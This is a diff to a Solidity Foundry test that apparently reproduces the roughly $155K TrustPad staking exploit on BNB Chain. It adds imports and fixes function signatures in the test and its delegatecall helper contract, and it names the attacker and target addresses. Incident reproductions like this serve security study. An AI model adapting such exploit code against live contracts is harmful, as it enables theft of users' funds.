@@ -3,6 +3,9 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
 // @KeyInfo - Total Lost : ~$155K
 // Attacker : https://bscscan.com/address/0x1a7b15354e2f6564fcf6960c79542de251ce0dc9
 // Attack Contract : https://bscscan.com/address/0x1694d7fabf3b28f11d65deeb9f60810daa26909a
@@ -47,7 +50,7 @@ contract ContractTest is Test {
     IERC20 private constant TPAD = IERC20(0xADCFC6bf853a0a8ad7f9Ff4244140D10cf01363C);
     IERC20 private constant DDD = IERC20(0x2e1FC745937a44ae8313bC889EE023ee303F2488);
     IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
-    IUniswapV2Router private constant Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV2Router private constant Router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     address private constant TrustPadProtocolExploiter = 0x1a7b15354e2F6564fcf6960c79542DE251cE0dC9;
     HelperContract helperContract;
 
@@ -116,7 +119,7 @@ contract ContractTest is Test {
         return true;
     }
 
-    function depositLockStart(address addr) external returns (uint256) {
+    function depositLockStart(address addr) external {
         (bool success,) =
             address(helperContract).delegatecall(abi.encodeWithSignature("depositLockStart(address)", addr));
         require(success, "Delegatecall to depositLockStart failed");
@@ -158,7 +161,7 @@ contract HelperContract is Test {
         require((withdrawAmount - _amount) == TPAD.balanceOf(address(this)));
     }
 
-    function depositLockStart(address addr) external returns (uint256) {
+    function depositLockStart(address addr) external view returns (uint256) {
         uint256 start;
         if (_depositLockStart != uint256(0)) {
             uint256 lockPeriod = LaunchpadLockableStaking.lockPeriod();
